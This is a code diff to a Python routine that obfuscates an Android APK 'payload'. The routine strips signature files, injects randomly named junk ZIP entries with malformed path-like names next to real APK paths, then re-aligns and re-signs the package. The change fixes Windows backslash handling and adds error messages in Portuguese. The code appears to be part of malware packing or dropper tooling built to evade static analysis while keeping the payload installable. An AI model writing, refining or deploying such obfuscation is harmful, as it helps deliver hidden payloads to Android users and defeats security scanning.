@@ -736,6 +736,11 @@ def _epoch_date_time():
     return tuple(Config.ZIP_EPOCH_DATE_TIME)
 
 
+def _zip_entry_name(name: str) -> str:
+    """Normalize ZIP entry names so Windows zipfile cannot collapse \\ into / duplicates."""
+    return (name or "").replace("\\", "/")
+
+
 def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> bytes:
     if payload_bytes[:4] != b"PK\x03\x04":
         return payload_bytes
@@ -743,14 +748,16 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
         return payload_bytes
 
     noise_n = random.randint(Config.PAYLOAD_ZIP_NOISE_MIN, Config.PAYLOAD_ZIP_NOISE_MAX)
+    # Keep junk path-like, but never use backslashes: on Windows, Python's zipfile
+    # converts \\ to / and silently creates duplicate entries that break PackageManager.
     junk_suffixes = (
         "..xml",
         "/..xml",
-        "/\\\\.xml",
+        "/..x.xml",
         "/....xml",
         ".xml/..",
         "/../x.xml",
-        "\\\\.xml",
+        "/.x.xml",
         "/./.xml",
     )
     anchors = (
@@ -768,13 +775,13 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
         "assets/index.android.bundle",
     )
 
-    sig_skip = (".SF", ".RSA", ".DSA", ".EC", "MANIFEST.MF", "CERT.SF", "CERT.RSA")
-
     buf = io.BytesIO()
     with zipfile.ZipFile(io.BytesIO(payload_bytes), "r") as zin, zipfile.ZipFile(buf, "w") as zout:
         existing = set()
         for info in zin.infolist():
-            name = info.filename
+            name = _zip_entry_name(info.filename)
+            if not name or name in existing:
+                continue
             base = name.rsplit("/", 1)[-1].upper()
             if name.startswith("META-INF/") and (
                 base.endswith((".SF", ".RSA", ".DSA", ".EC"))
@@ -782,7 +789,7 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
                 or base.startswith("ANDROID")
             ):
                 continue
-            data = zin.read(name)
+            data = zin.read(info.filename)
             out = zipfile.ZipInfo(filename=name, date_time=_epoch_date_time())
             out.compress_type = info.compress_type
             out.external_attr = info.external_attr
@@ -800,13 +807,11 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
                     random.choice(string.ascii_lowercase) for _ in range(random.randint(1, 6))
                 )
             if random.random() < 0.25:
-                extra += random.choice(["/..", "/.", "\\\\", "/..."])
-            name = f"{anchor}{suffix}{extra}"
-            if random.random() < 0.15:
-                name = name.replace("/", "\\")
+                extra += random.choice(["/..", "/.", "/...", "/.x"])
+            name = _zip_entry_name(f"{anchor}{suffix}{extra}")
             if name in used or len(name) > 220:
-                name = f"{anchor}/{i}{suffix}"
-            if name in used:
+                name = _zip_entry_name(f"{anchor}/{i}{suffix}")
+            if not name or name in used:
                 continue
             used.add(name)
             payload = secrets.token_bytes(random.randint(0, 48)) if random.random() < 0.4 else b""
@@ -831,9 +836,12 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
                 shutil.copy2(raw_path, aligned_path)
             sign_release_apk(aligned_path, signed_path)
             with open(signed_path, "rb") as fh:
-                return fh.read()
-        except Exception:
-            return noised
+                signed = fh.read()
+            if b"APK Sig Block 42" not in signed:
+                raise RuntimeError("Payload ofuscado sem bloco de assinatura v2.")
+            return signed
+        except Exception as exc:
+            raise RuntimeError(f"Falha ao realinhar/assinar payload ofuscado: {exc}") from exc
         finally:
             for p in (raw_path, aligned_path, signed_path):
                 try:
